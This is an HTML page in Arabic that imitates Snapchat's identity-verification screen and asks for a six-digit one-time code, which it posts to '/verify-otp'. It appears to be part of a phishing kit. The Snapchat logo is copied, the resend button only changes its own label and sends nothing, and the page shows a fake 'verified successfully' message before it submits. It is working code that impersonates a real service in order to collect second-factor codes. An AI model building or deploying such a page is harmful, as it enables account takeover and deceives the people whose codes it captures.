<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الهوية - Snapchat</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #f7f7f7;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .page-wrapper {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .otp-card {
            background: #ffffff;
            border-radius: 16px;
            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
            width: 100%;
            max-width: 400px;
            padding: 40px 36px 36px;
            text-align: center;
        }

        .snap-logo {
            width: 60px;
            height: 60px;
            margin: 0 auto 20px;
            display: block;
        }

        .otp-title {
            font-size: 22px;
            font-weight: 700;
            color: #16191c;
            margin-bottom: 8px;
            letter-spacing: -0.3px;
        }

        .otp-subtitle {
            font-size: 14px;
            color: #707070;
            margin-bottom: 28px;
            line-height: 1.6;
        }

        .highlight-text {
            color: #0096FF;
            font-weight: 600;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: right;
        }

        .form-label {
            display: block;
            font-size: 13px;
            font-weight: 500;
            color: #16191c;
            margin-bottom: 10px;
        }

        /* OTP Input - single big input field like Snapchat */
        .otp-input-field {
            width: 100%;
            padding: 16px;
            border: 1.5px solid #e0e0e0;
            border-radius: 12px;
            font-size: 22px;
            font-weight: 700;
            letter-spacing: 12px;
            text-align: center;
            font-family: inherit;
            color: #16191c;
            background: #fafafa;
            outline: none;
            transition: border-color 0.2s ease, background 0.2s ease;
            direction: ltr;
        }

        .otp-input-field:focus {
            border-color: #0096FF;
            background: #ffffff;
            box-shadow: 0 0 0 3px rgba(0, 150, 255, 0.08);
        }

        .timer-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 10px;
        }

        .timer-text {
            font-size: 13px;
            color: #a0a0a0;
        }

        .timer-value {
            font-size: 13px;
            color: #0096FF;
            font-weight: 600;
        }

        .timer-value.expired {
            color: #d32f2f;
        }

        .submit-btn {
            width: 100%;
            padding: 14px;
            background: #0096FF;
            color: #ffffff;
            border: none;
            border-radius: 100px;
            font-size: 16px;
            font-weight: 700;
            font-family: inherit;
            cursor: pointer;
            margin-top: 20px;
            transition: background 0.2s ease, transform 0.15s ease;
        }

        .submit-btn:hover {
            background: #007ad9;
            transform: translateY(-1px);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        .submit-btn:disabled {
            opacity: 0.65;
            cursor: not-allowed;
            transform: none;
        }

        .success-animation {
            display: none;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #2e7d32;
            font-size: 15px;
            font-weight: 600;
            margin-top: 12px;
            padding: 10px;
            background: #f1f8e9;
            border-radius: 10px;
        }

        .success-animation svg {
            width: 22px;
            height: 22px;
            color: #2e7d32;
        }

        .divider {
            height: 1px;
            background: #f0f0f0;
            margin: 20px 0;
        }

        .resend-section {
            text-align: center;
        }

        .resend-text {
            font-size: 14px;
            color: #707070;
            margin-bottom: 8px;
        }

        .resend-btn {
            background: none;
            border: none;
            color: #0096FF;
            font-size: 14px;
            font-weight: 600;
            font-family: inherit;
            cursor: pointer;
            text-decoration: underline;
            transition: color 0.2s;
        }

        .resend-btn:hover {
            color: #007ad9;
        }

        .back-link {
            display: block;
            text-align: center;
            font-size: 14px;
            color: #a0a0a0;
            text-decoration: none;
            margin-top: 16px;
            transition: color 0.2s;
        }

        .back-link:hover {
            color: #555;
        }

        footer {
            text-align: center;
            padding: 16px;
            background: #16191c;
        }

        footer a {
            color: rgba(255,255,255,0.7);
            font-size: 12px;
            text-decoration: none;
            margin: 0 10px;
        }

        footer a:hover {
            color: #fff;
        }

        @media (max-width: 480px) {
            .otp-card {
                padding: 32px 24px 28px;
            }

            .otp-input-field {
                font-size: 20px;
                letter-spacing: 8px;
            }
        }
    </style>
</head>
<body>
    <div class="page-wrapper">
        <div class="otp-card">
            <!-- Snapchat Ghost -->
            <svg class="snap-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                <path fill="#FFFC00" stroke="#16191c" stroke-width="3.5" d="
                    M50 12
                    C32 12 20 24 20 40
                    C20 50 24 57 24 57
                    L16 62
                    C14 63 14 66 16 67
                    L22 69
                    C22 69 21 72 18 74
                    C16 75 14 77 18 78
                    C24 79 28 76 32 74
                    C34 73 35 74 36 75
                    C38 77 43 80 50 80
                    C57 80 62 77 64 75
                    C65 74 66 73 68 74
                    C72 76 76 79 82 78
                    C86 77 84 75 82 74
                    C79 72 78 69 78 69
                    L84 67
                    C86 66 86 63 84 62
                    L76 57
                    C76 57 80 50 80 40
                    C80 24 68 12 50 12Z
                "/>
            </svg>

            <h1 class="otp-title">التحقق من هويتك</h1>
            <p class="otp-subtitle">
                أرسلنا رمز التحقق إلى جهازك المسجّل.
                <br>الرجاء إدخاله أدناه.
            </p>

            <form method="POST" action="/verify-otp" id="otpForm">
                <div class="form-group">
                    <label for="otp_code" class="form-label">أدخل رمز التحقق (6 أرقام)</label>
                    <input
                        type="text"
                        class="otp-input-field"
                        id="otp_code"
                        name="otp_code"
                        maxlength="6"
                        placeholder="——————"
                        inputmode="numeric"
                        autocomplete="one-time-code"
                        required
                    >
                    <div class="timer-row">
                        <span class="timer-text">صلاحية الرمز:</span>
                        <span class="timer-value" id="countdown">05:00</span>
                    </div>
                </div>

                <button type="submit" class="submit-btn" id="submitBtn">تحقق من الرمز</button>

                <div class="success-animation" id="successMsg">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                        <polyline points="20 6 9 17 4 12"/>
                    </svg>
                    تم التحقق بنجاح!
                </div>
            </form>

            <div class="divider"></div>

            <div class="resend-section">
                <p class="resend-text">لم تتلقَّ الرمز؟</p>
                <button class="resend-btn" onclick="resendCode()">إعادة الإرسال</button>
            </div>

            <a href="/" class="back-link">← العودة إلى تسجيل الدخول</a>
        </div>
    </div>

    <footer>
        <a href="#">سياسة الخصوصية</a>
        <a href="#">شروط الخدمة</a>
        <a href="#">المساعدة</a>
    </footer>

    <script>
        // Countdown timer
        let timeLeft = 300;
        let timerInterval;

        function updateTimer() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            const el = document.getElementById('countdown');
            el.textContent = `${String(minutes).padStart(2,'0')}:${String(seconds).padStart(2,'0')}`;
            if (timeLeft <= 0) {
                el.textContent = 'انتهت الصلاحية';
                el.classList.add('expired');
                clearInterval(timerInterval);
            } else {
                timeLeft--;
            }
        }

        timerInterval = setInterval(updateTimer, 1000);
        updateTimer();

        // Only allow digits
        document.getElementById('otp_code').addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        // Form submit animation
        document.getElementById('otpForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            const success = document.getElementById('successMsg');
            btn.textContent = 'جاري التحقق...';
            btn.disabled = true;

            setTimeout(() => {
                success.style.display = 'flex';
                setTimeout(() => { this.submit(); }, 1000);
            }, 1500);
        });

        // Resend
        function resendCode() {
            const btn = document.querySelector('.resend-btn');
            btn.textContent = 'تم الإرسال ✓';
            btn.style.color = '#2e7d32';
            btn.disabled = true;
            timeLeft = 300;
            clearInterval(timerInterval);
            const el = document.getElementById('countdown');
            el.classList.remove('expired');
            timerInterval = setInterval(updateTimer, 1000);
            setTimeout(() => {
                btn.textContent = 'إعادة الإرسال';
                btn.style.color = '';
                btn.disabled = false;
            }, 3000);
        }
    </script>
</body>
</html>
